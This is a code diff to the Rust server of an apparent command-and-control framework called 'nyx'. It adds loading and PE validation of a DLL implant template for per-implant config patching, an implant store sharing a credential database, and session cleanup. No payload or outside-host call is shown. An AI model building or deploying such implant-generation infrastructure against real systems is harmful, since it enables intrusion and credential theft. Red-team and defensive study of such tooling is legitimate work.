@@ -175,6 +175,54 @@ async fn main() -> anyhow::Result<()> {
         }
     };
 
+    // Implant generation: DLL template (pre-compiled by CI) for server-side
+    // per-implant config patching. When NYX_TEMPLATE is set, the generation
+    // endpoint is live. The template is read once at startup and kept in memory.
+    let template = match std::env::var("NYX_TEMPLATE") {
+        Ok(path) => {
+            let bytes = std::fs::read(&path)
+                .map_err(|e| anyhow::anyhow!("failed to read DLL template {path}: {e}"))?;
+            // Validate PE structure (MZ + PE sig + minimum size) so a
+            // corrupted/truncated file is caught at startup, not at generation.
+            nyx_server::implant_gen::validate_template_pe(&bytes)
+                .map_err(|e| anyhow::anyhow!("invalid DLL template {path}: {e}"))?;
+            // Sanity: a real DLL is at least a few KiB (PE header + sections).
+            if bytes.len() < 4096 {
+                anyhow::bail!("DLL template {path} is too small ({len} bytes) — not a valid PE DLL", len = bytes.len());
+            }
+            // Verify the .nyx_cfg section exists (look for 0xAA*1024 pattern).
+            let has_nyx_cfg = bytes
+                .windows(8)
+                .any(|w| w[0] == 0x41 && w[1] == 0x41 && w[2] == 0x41 && w[3] == 0x41
+                      && w[4] == 0xAA && w[5] == 0xAA);
+            if !has_nyx_cfg {
+                tracing::warn!(
+                    "DLL template {path}: .nyx_cfg section with 0x41414141 magic + 0xAA padding not found; \
+                     generation will fail at patch time"
+                );
+            }
+            tracing::info!(template = %path, len = bytes.len(), "DLL template loaded for implant generation");
+            Some(Arc::new(bytes))
+        }
+        Err(_) => {
+            tracing::info!("NYX_TEMPLATE not set — implant generation endpoint disabled");
+            None
+        }
+    };
+
+    // Implant store: shares the same DB file as the cred store. We open a
+    // separate connection (SQLite WAL handles concurrent access).
+    let implant_store = match nyx_store::ImplantStore::open(std::path::Path::new(&creds_path)) {
+        Ok(s) => {
+            tracing::info!(db = %creds_path, "implant store opened");
+            Some(Arc::new(s))
+        }
+        Err(e) => {
+            tracing::warn!(error = %e, "failed to open implant store; implant generation disabled");
+            None
+        }
+    };
+
     let mut state = AppState {
         keypair,
         sessions: Default::default(),
@@ -187,6 +235,9 @@ async fn main() -> anyhow::Result<()> {
         operators: Arc::new(operators),
         audit: Some(Arc::new(audit_writer)),
         kernel,
+        template,
+        implant_rate_limiter: Default::default(),
+        implants: implant_store,
     };
     state.register_default_hooks();
     // Optional operator automation: a Rhai script run on session/result events.
@@ -202,6 +253,9 @@ async fn main() -> anyhow::Result<()> {
         }
     }
     let state = Arc::new(state);
+
+    // Start the background session garbage collector (age + idle eviction).
+    nyx_server::spawn_session_gc(state.clone());
 
     let pubkey = hex::encode(state.keypair.public_bytes());
 
